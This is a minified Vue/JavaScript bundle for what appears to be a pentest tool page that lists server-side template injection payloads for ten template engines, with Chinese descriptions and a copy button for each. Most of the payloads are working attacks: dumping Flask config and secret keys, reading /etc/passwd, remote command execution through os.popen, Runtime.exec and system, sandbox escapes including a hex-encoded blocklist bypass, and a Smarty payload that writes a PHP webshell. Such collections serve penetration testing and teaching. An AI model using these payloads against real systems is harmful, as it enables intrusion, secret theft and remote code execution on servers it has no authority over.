import{u as F,i as B}from"./action-DbkO0_5I.js";import{l as V,ay as I,Q as M,I as u,J as r,A as _,H as s,u as d,C as y,K as g,L as f,V as R,P as J,z as N,D as O,G as h,ap as A,y as p}from"./vendor-D2QpS8Sq.js";import{_ as L}from"./tool-Tf4xlnLR.js";import"./vendor-lodash-BDISS5yc.js";import"./modulepreload-polyfill-B5Qt9EMX.js";import"./vendor-monaco-CZQ85J0D.js";const D=[{id:"detection",name:"探测/识别",nameEn:"Detection"},{id:"info_disclosure",name:"信息泄露",nameEn:"Info Disclosure"},{id:"file_read",name:"文件读取",nameEn:"File Read"},{id:"rce",name:"远程命令执行",nameEn:"RCE"},{id:"sandbox_escape",name:"沙箱逃逸",nameEn:"Sandbox Escape"}],H={id:"jinja2",name:"Jinja2",nameEn:"Jinja2",language:"Python",payloads:[{id:"j2-det-1",name:"Jinja2 detection (multiply)",payload:"{{7*7}}",engine:"jinja2",purpose:"detection",description:"返回 49 则确认存在 Jinja2 SSTI"},{id:"j2-det-2",name:"Jinja2 detection (string)",payload:"{{7*'7'}}",engine:"jinja2",purpose:"detection",description:"返回 7777777 则确认为 Jinja2（Twig 返回 49）"},{id:"j2-det-3",name:"Jinja2 detection (class)",payload:"{{'test'.__class__}}",engine:"jinja2",purpose:"detection",description:"返回 <class 'str'> 确认 Python 模板引擎"},{id:"j2-info-1",name:"Flask config dump",payload:"{{config}}",engine:"jinja2",purpose:"info_disclosure",description:"泄露 Flask 完整配置（SECRET_KEY、数据库 URI 等）"},{id:"j2-info-2",name:"Flask config items",payload:"{{config.items()}}",engine:"jinja2",purpose:"info_disclosure",description:"以键值对方式列出所有 Flask 配置项"},{id:"j2-info-3",name:"Self object",payload:"{{self}}",engine:"jinja2",purpose:"info_disclosure",description:"查看模板自身对象信息"},{id:"j2-info-4",name:"Request environ",payload:"{{request.environ}}",engine:"jinja2",purpose:"info_disclosure",description:"泄露 WSGI 环境变量（包含 HTTP 头、路径等）"},{id:"j2-info-5",name:"List subclasses",payload:"{{''.__class__.__mro__[1].__subclasses__()}}",engine:"jinja2",purpose:"info_disclosure",description:"列出 object 基类的所有子类，用于寻找可利用的类"},{id:"j2-file-1",name:"File read via open()",payload:"{{''.__class__.__mro__[1].__subclasses__()[OPEN_INDEX]('/etc/passwd').read()}}",engine:"jinja2",purpose:"file_read",description:"通过 subclasses 中的 _io.FileIO / open 类读取文件（需找到正确的索引）"},{id:"j2-file-2",name:"File read via cycler",payload:"{{cycler.__init__.__globals__.os.popen('cat /etc/passwd').read()}}",engine:"jinja2",purpose:"file_read",description:"通过 Jinja2 内置的 cycler 对象访问 os 模块读取文件"},{id:"j2-rce-1",name:"RCE via os.popen (lipsum)",payload:'{{lipsum.__globals__["os"].popen("id").read()}}',engine:"jinja2",purpose:"rce",description:"利用 Jinja2 内置的 lipsum 函数访问 os.popen 执行命令"},{id:"j2-rce-2",name:"RCE via cycler",payload:"{{cycler.__init__.__globals__.os.popen('id').read()}}",engine:"jinja2",purpose:"rce",description:"通过 cycler 对象的 __globals__ 访问 os 模块"},{id:"j2-rce-3",name:"RCE via joiner",payload:"{{joiner.__init__.__globals__.os.popen('id').read()}}",engine:"jinja2",purpose:"rce",description:"通过 joiner 对象的 __globals__ 访问 os 模块"},{id:"j2-rce-4",name:"RCE via namespace",payload:"{{namespace.__init__.__globals__.os.popen('id').read()}}",engine:"jinja2",purpose:"rce",description:"通过 namespace 对象访问 os 模块"},{id:"j2-rce-5",name:"RCE via request.application",payload:"{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__['os'].popen('id').read()}}",engine:"jinja2",purpose:"rce",description:"通过 Flask request 对象链式访问 os 模块"},{id:"j2-rce-6",name:"RCE via subclass Popen",payload:"{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()}}",engine:"jinja2",purpose:"rce",description:"找到 subprocess.Popen 子类索引后直接执行命令"},{id:"j2-sandbox-1",name:"Sandbox escape (MRO chain)",payload:"{%for x in ''.__class__.__mro__[1].__subclasses__()%}{%if x.__name__=='catch_warnings'%}{{x.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",engine:"jinja2",purpose:"sandbox_escape",description:"遍历子类找 catch_warnings 并通过 __builtins__ 导入 os"},{id:"j2-sandbox-2",name:"Sandbox escape (attr filter)",payload:"{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}",engine:"jinja2",purpose:"sandbox_escape",description:"使用 attr 过滤器 + 十六进制编码绕过关键字黑名单"}]},U={id:"twig",name:"Twig",nameEn:"Twig",language:"PHP",payloads:[{id:"tw-det-1",name:"Twig detection (multiply)",payload:"{{7*7}}",engine:"twig",purpose:"detection",description:"返回 49 确认模板注入"},{id:"tw-det-2",name:"Twig detection (string repeat)",payload:"{{7*'7'}}",engine:"twig",purpose:"detection",description:"Twig 返回 49（不是 7777777），区别于 Jinja2"},{id:"tw-det-3",name:"Twig version check",payload:"{{constant('Twig\\Environment::VERSION')}}",engine:"twig",purpose:"detection",description:"获取 Twig 版本号"},{id:"tw-info-1",name:"Twig dump _context",payload:"{{dump()}}",engine:"twig",purpose:"info_disclosure",description:"泄露当前模板上下文中的所有变量"},{id:"tw-info-2",name:"Twig app environment",payload:"{{app.environment}}",engine:"twig",purpose:"info_disclosure",description:"获取 Symfony 应用环境（dev/prod）"},{id:"tw-file-1",name:"Twig file_get_contents",payload:"{{'/etc/passwd'|file_excerpt(1,-1)}}",engine:"twig",purpose:"file_read",description:"利用 Twig 的 file_excerpt 过滤器读取文件内容"},{id:"tw-file-2",name:"Twig source function",payload:"{{source('/etc/passwd')}}",engine:"twig",purpose:"file_read",description:"使用 Twig source() 函数读取文件（如果可用）"},{id:"tw-rce-1",name:"Twig RCE (registerUndefinedFilterCallback)",payload:'{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',engine:"twig",purpose:"rce",description:"Twig 1.x 经典 RCE — 注册 exec 作为未定义过滤器回调"},{id:"tw-rce-2",name:"Twig RCE (system via filter)",payload:'{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}',engine:"twig",purpose:"rce",description:"使用 system() 替代 exec() 获取命令输出"},{id:"tw-rce-3",name:"Twig 3.x RCE (map filter)",payload:'{{["id"]|map("system")}}',engine:"twig",purpose:"rce",description:"Twig 2.x/3.x — 利用 map 过滤器配合 system 函数执行命令"},{id:"tw-rce-4",name:"Twig RCE (reduce filter)",payload:'{{[0]|reduce("system","id")}}',engine:"twig",purpose:"rce",description:"Twig 2.x/3.x — 通过 reduce 过滤器执行命令"},{id:"tw-rce-5",name:"Twig RCE (sort filter)",payload:'{{["id",0]|sort("system")}}',engine:"twig",purpose:"rce",description:"Twig 2.x/3.x — 通过 sort 过滤器执行命令"}]},q={id:"freemarker",name:"FreeMarker",nameEn:"FreeMarker",language:"Java",payloads:[{id:"fm-det-1",name:"FreeMarker detection",payload:"${7*7}",engine:"freemarker",purpose:"detection",description:"返回 49 确认模板注入"},{id:"fm-det-2",name:"FreeMarker detection (#{} syntax)",payload:"#{7*7}",engine:"freemarker",purpose:"detection",description:"FreeMarker 数值插值语法"},{id:"fm-info-1",name:"FreeMarker .data_model",payload:"<#assign keys = .data_model?keys><#list keys as key>${key}: ${.data_model[key]!''}<br></#list>",engine:"freemarker",purpose:"info_disclosure",description:"列出数据模型中所有可用的变量"},{id:"fm-info-2",name:"FreeMarker version",payload:"${.version}",engine:"freemarker",purpose:"info_disclosure",description:"获取 FreeMarker 版本号"},{id:"fm-file-1",name:"FreeMarker file read (new)",payload:'<#assign is = "freemarker.template.utility.ObjectConstructor"?new()("java.io.FileInputStream","/etc/passwd")><#assign isr = "freemarker.template.utility.ObjectConstructor"?new()("java.io.InputStreamReader",is)><#assign br = "freemarker.template.utility.ObjectConstructor"?new()("java.io.BufferedReader",isr)><#assign line = br.readLine()>${line}',engine:"freemarker",purpose:"file_read",description:"通过 ObjectConstructor 构造 Java I/O 读取文件"},{id:"fm-rce-1",name:"FreeMarker RCE (Execute)",payload:'<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}',engine:"freemarker",purpose:"rce",description:"经典 FreeMarker RCE — 使用 Execute 工具类"},{id:"fm-rce-2",name:"FreeMarker RCE (ObjectConstructor)",payload:'<#assign oc = "freemarker.template.utility.ObjectConstructor"?new()>${oc("java.lang.Runtime").getRuntime().exec("id")}',engine:"freemarker",purpose:"rce",description:"通过 ObjectConstructor 获取 Runtime 实例执行命令"},{id:"fm-rce-3",name:"FreeMarker RCE (JythonRuntime)",payload:'<#assign jr = "freemarker.template.utility.JythonRuntime"?new()><@jr>import os;os.system("id")</@jr>',engine:"freemarker",purpose:"rce",description:"如果 Jython 可用，通过 JythonRuntime 执行 Python 代码"},{id:"fm-rce-4",name:"FreeMarker RCE (ProcessBuilder)",payload:'<#assign pb = "freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["id"])>${pb.start()}',engine:"freemarker",purpose:"rce",description:"通过 ProcessBuilder 执行命令"},{id:"fm-sandbox-1",name:"FreeMarker sandbox bypass (api)",payload:"<#assign classloader = object?api.class.protectionDomain.classLoader>${classloader}",engine:"freemarker",purpose:"sandbox_escape",description:"使用 ?api 内建函数绕过沙箱访问 Java 对象 API"}]},Y={id:"velocity",name:"Velocity",nameEn:"Velocity",language:"Java",payloads:[{id:"vel-det-1",name:"Velocity detection",payload:"#set($x=7*7)$x",engine:"velocity",purpose:"detection",description:"返回 49 确认 Velocity 模板注入"},{id:"vel-det-2",name:"Velocity detection (class)",payload:'$class.inspect("java.lang.Runtime")',engine:"velocity",purpose:"detection",description:"尝试访问 ClassTool（如果可用）"},{id:"vel-info-1",name:"Velocity context dump",payload:"#foreach($key in $context.keys)$key = $context.get($key)<br>#end",engine:"velocity",purpose:"info_disclosure",description:"遍历 Velocity 上下文中的所有变量"},{id:"vel-info-2",name:"Velocity system properties",payload:'#set($s="")$s.getClass().forName("java.lang.System").getProperty("os.name")',engine:"velocity",purpose:"info_disclosure",description:"获取操作系统名称"},{id:"vel-rce-1",name:"Velocity RCE (Runtime.exec)",payload:'#set($e="")$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")',engine:"velocity",purpose:"rce",description:"经典 Velocity RCE — 通过反射获取 Runtime 实例执行命令"},{id:"vel-rce-2",name:"Velocity RCE (ProcessBuilder)",payload:'#set($e="")#set($pb=$e.getClass().forName("java.lang.ProcessBuilder"))#set($c=$pb.getDeclaredConstructors())#set($p=$c[0].newInstance(["id"]))$p.start()',engine:"velocity",purpose:"rce",description:"通过反射创建 ProcessBuilder 执行命令"},{id:"vel-rce-3",name:"Velocity RCE with output",payload:'#set($e="")#set($proc=$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))#set($is=$proc.getInputStream())#set($isr=$e.getClass().forName("java.io.InputStreamReader").getConstructor($is.getClass()).newInstance($is))#set($br=$e.getClass().forName("java.io.BufferedReader").getConstructor($isr.getClass()).newInstance($isr))$br.readLine()',engine:"velocity",purpose:"rce",description:"执行命令并读取输出结果"},{id:"vel-rce-4",name:"Velocity RCE via ClassTool",payload:'$class.inspect("java.lang.Runtime").type.getRuntime().exec("id").waitFor()',engine:"velocity",purpose:"rce",description:"使用 Velocity ClassTool 直接访问 Runtime（需要 velocity-tools）"}]},z={id:"mako",name:"Mako",nameEn:"Mako",language:"Python",payloads:[{id:"mk-det-1",name:"Mako detection",payload:"${7*7}",engine:"mako",purpose:"detection",description:"返回 49 确认 Mako 模板注入"},{id:"mk-det-2",name:"Mako detection (Python expr)",payload:'${"test".upper()}',engine:"mako",purpose:"detection",description:"返回 TEST 确认 Python 表达式可执行"},{id:"mk-info-1",name:"Mako module info",payload:"${self.module.__name__}",engine:"mako",purpose:"info_disclosure",description:"获取模板模块名称"},{id:"mk-info-2",name:"Mako dir context",payload:"${dir(self)}",engine:"mako",purpose:"info_disclosure",description:"列出模板 self 对象的所有属性"},{id:"mk-file-1",name:"Mako file read",payload:'${open("/etc/passwd").read()}',engine:"mako",purpose:"file_read",description:"Mako 允许直接调用 Python 内建函数读取文件"},{id:"mk-rce-1",name:"Mako RCE (os.popen)",payload:'<%import os%>${os.popen("id").read()}',engine:"mako",purpose:"rce",description:"Mako 支持 <% %> Python 代码块，直接导入 os 模块执行命令"},{id:"mk-rce-2",name:"Mako RCE (subprocess)",payload:'<%import subprocess%>${subprocess.check_output("id",shell=True).decode()}',engine:"mako",purpose:"rce",description:"使用 subprocess 模块执行命令并获取输出"},{id:"mk-rce-3",name:"Mako RCE (inline expression)",payload:'${__import__("os").popen("id").read()}',engine:"mako",purpose:"rce",description:"在表达式中使用 __import__ 执行命令（无需代码块）"}]},W={id:"smarty",name:"Smarty",nameEn:"Smarty",language:"PHP",payloads:[{id:"sm-det-1",name:"Smarty detection (math)",payload:"{7*7}",engine:"smarty",purpose:"detection",description:"返回 49 确认模板注入（Smarty 使用花括号）"},{id:"sm-det-2",name:"Smarty detection ($smarty.version)",payload:"{$smarty.version}",engine:"smarty",purpose:"detection",description:"获取 Smarty 版本号"},{id:"sm-info-1",name:"Smarty server vars",payload:"{$smarty.server.SERVER_NAME}",engine:"smarty",purpose:"info_disclosure",description:"读取 $_SERVER 变量"},{id:"sm-info-2",name:"Smarty environment",payload:"{$smarty.env.PATH}",engine:"smarty",purpose:"info_disclosure",description:"读取环境变量 PATH"},{id:"sm-file-1",name:"Smarty file read (fetch)",payload:'{fetch file="/etc/passwd"}',engine:"smarty",purpose:"file_read",description:"使用 Smarty fetch 函数读取本地文件"},{id:"sm-rce-1",name:"Smarty RCE ({php} tag)",payload:"{php}echo `id`;{/php}",engine:"smarty",purpose:"rce",description:"Smarty 2.x {php} 标签直接执行 PHP 代码（3.x 已移除）"},{id:"sm-rce-2",name:"Smarty RCE (system)",payload:'{system("id")}',engine:"smarty",purpose:"rce",description:"直接调用 PHP system() 函数"},{id:"sm-rce-3",name:"Smarty RCE (passthru)",payload:'{passthru("id")}',engine:"smarty",purpose:"rce",description:"使用 passthru() 执行命令并直接输出原始结果"},{id:"sm-rce-4",name:"Smarty RCE (Smarty_Internal_Write_File)",payload:`{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['cmd']); ?>",self::clearConfig())}`,engine:"smarty",purpose:"rce",description:"利用 Smarty 内部类写入 Webshell"},{id:"sm-rce-5",name:"Smarty RCE (if tag)",payload:'{if system("id")}{/if}',engine:"smarty",purpose:"rce",description:"在 {if} 标签中执行 PHP 表达式"}]},G={id:"erb",name:"ERB",nameEn:"ERB",language:"Ruby",payloads:[{id:"erb-det-1",name:"ERB detection (multiply)",payload:"<%= 7*7 %>",engine:"erb",purpose:"detection",description:"返回 49 确认 ERB 模板注入"},{id:"erb-det-2",name:"ERB detection (class)",payload:"<%= self.class %>",engine:"erb",purpose:"detection",description:"返回当前 binding 的类名"},{id:"erb-info-1",name:"ERB environment",payload:"<%= ENV.to_a %>",engine:"erb",purpose:"info_disclosure",description:"列出所有环境变量"},{id:"erb-info-2",name:"ERB Ruby version",payload:"<%= RUBY_VERSION %>",engine:"erb",purpose:"info_disclosure",description:"获取 Ruby 版本号"},{id:"erb-file-1",name:"ERB file read",payload:'<%= File.read("/etc/passwd") %>',engine:"erb",purpose:"file_read",description:"使用 Ruby File.read 读取文件"},{id:"erb-file-2",name:"ERB file read (open)",payload:'<%= File.open("/etc/passwd").read %>',engine:"erb",purpose:"file_read",description:"使用 File.open 读取文件"},{id:"erb-rce-1",name:"ERB RCE (system)",payload:'<%= system("id") %>',engine:"erb",purpose:"rce",description:"使用 Ruby system() 执行命令"},{id:"erb-rce-2",name:"ERB RCE (backticks)",payload:"<%=`id`%>",engine:"erb",purpose:"rce",description:"使用反引号执行命令并返回输出"},{id:"erb-rce-3",name:"ERB RCE (%x)",payload:"<%= %x(id) %>",engine:"erb",purpose:"rce",description:"使用 %x() 语法执行命令"},{id:"erb-rce-4",name:"ERB RCE (IO.popen)",payload:'<%= IO.popen("id").read %>',engine:"erb",purpose:"rce",description:"使用 IO.popen 执行命令并读取输出"},{id:"erb-rce-5",name:"ERB RCE (exec with open3)",payload:`<% require 'open3'; stdout,_,_ = Open3.capture3("id") %><%= stdout %>`,engine:"erb",purpose:"rce",description:"使用 Open3 执行命令并捕获标准输出"}]},K={id:"pebble",name:"Pebble",nameEn:"Pebble",language:"Java",payloads:[{id:"pb-det-1",name:"Pebble detection",payload:"{{7*7}}",engine:"pebble",purpose:"detection",description:"返回 49 确认模板注入"},{id:"pb-det-2",name:"Pebble detection (bean)",payload:"{{beans}}",engine:"pebble",purpose:"detection",description:"尝试访问 Spring beans（如果集成了 Spring）"},{id:"pb-info-1",name:"Pebble Spring beans list",payload:"{{beans.toString()}}",engine:"pebble",purpose:"info_disclosure",description:"列出所有 Spring Bean 名称"},{id:"pb-rce-1",name:"Pebble RCE (Runtime.exec)",payload:"{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{(1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes])::([bytes].class))}}",engine:"pebble",purpose:"rce",description:"通过反射获取 Runtime 执行命令并读取输出"},{id:"pb-rce-2",name:"Pebble RCE (ProcessBuilder)",payload:"{% set pb = (1).TYPE.forName('java.lang.ProcessBuilder').constructors[0].newInstance([['id']]) %}{% set proc = pb.start() %}{{(1).TYPE.forName('java.lang.String').constructors[0].newInstance(([proc.inputStream.readAllBytes()])::([proc.inputStream.readAllBytes()].class))}}",engine:"pebble",purpose:"rce",description:"使用 ProcessBuilder 执行命令"}]},X={id:"thymeleaf",name:"Thymeleaf",nameEn:"Thymeleaf",language:"Java",payloads:[{id:"th-det-1",name:"Thymeleaf detection (SpEL)",payload:"__${7*7}__::x",engine:"thymeleaf",purpose:"detection",description:"Thymeleaf SpEL 表达式预处理注入，返回 49"},{id:"th-det-2",name:"Thymeleaf detection (T operator)",payload:"__${T(java.lang.Math).random()}__::x",engine:"thymeleaf",purpose:"detection",description:"使用 SpEL T() 运算符调用 Java 静态方法"},{id:"th-info-1",name:"Thymeleaf OS info",payload:'__${T(java.lang.System).getProperty("os.name")}__::x',engine:"thymeleaf",purpose:"info_disclosure",description:"获取操作系统名称"},{id:"th-info-2",name:"Thymeleaf Java version",payload:'__${T(java.lang.System).getProperty("java.version")}__::x',engine:"thymeleaf",purpose:"info_disclosure",description:"获取 Java 运行时版本"},{id:"th-info-3",name:"Thymeleaf user.dir",payload:'__${T(java.lang.System).getProperty("user.dir")}__::x',engine:"thymeleaf",purpose:"info_disclosure",description:"获取应用工作目录"},{id:"th-file-1",name:"Thymeleaf file read (Files)",payload:'__${T(java.nio.file.Files).readString(T(java.nio.file.Path).of("/etc/passwd"))}__::x',engine:"thymeleaf",purpose:"file_read",description:"通过 java.nio.file.Files 读取文件（Java 11+）"},{id:"th-rce-1",name:"Thymeleaf RCE (Runtime.exec)",payload:'__${T(java.lang.Runtime).getRuntime().exec("id")}__::x',engine:"thymeleaf",purpose:"rce",description:"通过 SpEL 表达式执行命令（无回显）"},{id:"th-rce-2",name:"Thymeleaf RCE with output",payload:'__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\\\A").next()}__::x',engine:"thymeleaf",purpose:"rce",description:"执行命令并通过 Scanner 读取输出"},{id:"th-rce-3",name:"Thymeleaf RCE (URL path)",payload:'__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x',engine:"thymeleaf",purpose:"rce",description:"在 URL 路径中注入 Thymeleaf 表达式（Spring View Name 注入）"},{id:"th-rce-4",name:"Thymeleaf RCE (ProcessBuilder)",payload:'__${new java.lang.ProcessBuilder(new java.util.ArrayList(T(java.util.Arrays).asList("id"))).start()}__::x',engine:"thymeleaf",purpose:"rce",description:"使用 ProcessBuilder 执行命令"}]},Q={id:"tornado",name:"Tornado",nameEn:"Tornado",language:"Python",payloads:[{id:"tn-det-1",name:"Tornado detection",payload:"{{7*7}}",engine:"tornado",purpose:"detection",description:"返回 49 确认模板注入"},{id:"tn-det-2",name:"Tornado detection (handler)",payload:"{{handler.settings}}",engine:"tornado",purpose:"detection",description:"访问 Tornado handler 设置确认引擎"},{id:"tn-info-1",name:"Tornado application settings",payload:"{{handler.settings}}",engine:"tornado",purpose:"info_disclosure",description:"泄露 Tornado Application 配置（可能包含 cookie_secret 等）"},{id:"tn-info-2",name:"Tornado request info",payload:"{{handler.request.headers}}",engine:"tornado",purpose:"info_disclosure",description:"获取当前请求的 HTTP 头信息"},{id:"tn-file-1",name:"Tornado file read",payload:'{%import os%}{{os.popen("cat /etc/passwd").read()}}',engine:"tornado",purpose:"file_read",description:"通过 import os 导入模块读取文件"},{id:"tn-rce-1",name:"Tornado RCE (import os)",payload:'{%import os%}{{os.popen("id").read()}}',engine:"tornado",purpose:"rce",description:"Tornado 模板支持 {% import %}，直接导入 os 模块执行命令"},{id:"tn-rce-2",name:"Tornado RCE (subprocess)",payload:'{%import subprocess%}{{subprocess.check_output("id",shell=True).decode()}}',engine:"tornado",purpose:"rce",description:"使用 subprocess 模块执行命令"},{id:"tn-rce-3",name:"Tornado RCE (eval chain)",payload:`{%autoescape None%}{{eval("__import__('os').popen('id').read()")}}`,engine:"tornado",purpose:"rce",description:"禁用自动转义后通过 eval 执行命令"}]},b=[H,U,q,Y,z,W,G,K,X,Q],Z={class:"sectool-ssti-count"},ee={class:"sectool-ssti-section-title"},ae={class:"sectool-ssti-lang"},ne=V({__name:"Ssti",async setup(ie){let l,v;const w=[{value:"all",label:"All"},...b.map(e=>({value:e.id,label:`${e.name} (${e.language})`}))],k=[{value:"all",label:"All"},...D.map(e=>({value:e.id,label:e.name}))],n=F(([l,v]=I(()=>B({selectedEngine:"all",selectedPurpose:"all",search:""})),l=await l,v(),l)),x=(e,a)=>{if(!a)return!0;const i=a.toLowerCase();return e.name.toLowerCase().includes(i)||e.payload.toLowerCase().includes(i)||e.engine.toLowerCase().includes(i)||(e.description||"").toLowerCase().includes(i)},j=h(()=>(n.current.selectedEngine==="all"?b:b.filter(a=>a.id===n.current.selectedEngine)).map(a=>{const i=a.payloads.filter(c=>n.current.selectedPurpose!=="all"&&c.purpose!==n.current.selectedPurpose?!1:x(c,n.current.search));return{...a,payloads:i}}).filter(a=>a.payloads.length>0)),T=h(()=>j.value.reduce((e,a)=>e+a.payloads.length,0));return(e,a)=>{const i=s("Select"),c=s("Input"),E=s("Align"),C=s("Display"),$=s("Textarea"),S=s("HeightResize"),P=A("row");return M((p(),u("div",null,[r(E,{direction:"vertical"},{default:_(()=>[r(C,null,{default:_(()=>[r(E,{direction:"vertical"},{default:_(()=>[r(i,{modelValue:d(n).current.selectedEngine,"onUpdate:modelValue":a[0]||(a[0]=o=>d(n).current.selectedEngine=o),label:e.$t("ssti_engine"),options:w},null,8,["modelValue","label"]),r(i,{modelValue:d(n).current.selectedPurpose,"onUpdate:modelValue":a[1]||(a[1]=o=>d(n).current.selectedPurpose=o),label:e.$t("ssti_purpose"),options:k},null,8,["modelValue","label"]),r(c,{modelValue:d(n).current.search,"onUpdate:modelValue":a[2]||(a[2]=o=>d(n).current.search=o),label:e.$t("ssti_search"),placeholder:e.$t("ssti_search_placeholder")},null,8,["modelValue","label","placeholder"])]),_:1})]),_:1})]),_:1}),r(S,null,{default:_(({height:o})=>[y("div",{style:O({height:o+"px",overflowY:"auto"})},[y("div",Z,g(e.$t("ssti_payload_count",[T.value])),1),(p(!0),u(f,null,R(j.value,m=>(p(),u(f,{key:m.id},[y("div",ee,[J(g(m.name)+" ",1),y("span",ae,g(m.language),1)]),(p(!0),u(f,null,R(m.payloads,t=>(p(),N($,{key:t.id,"model-value":t.payload,height:42,placeholder:t.name+(t.description?" — "+t.description:""),copy:t.name},null,8,["model-value","placeholder","copy"]))),128))],64))),128))],4)]),_:1})])),[[P,"10-14"]])}}}),le=L(ne,[["__scopeId","data-v-f654d75a"]]);export{le as default};
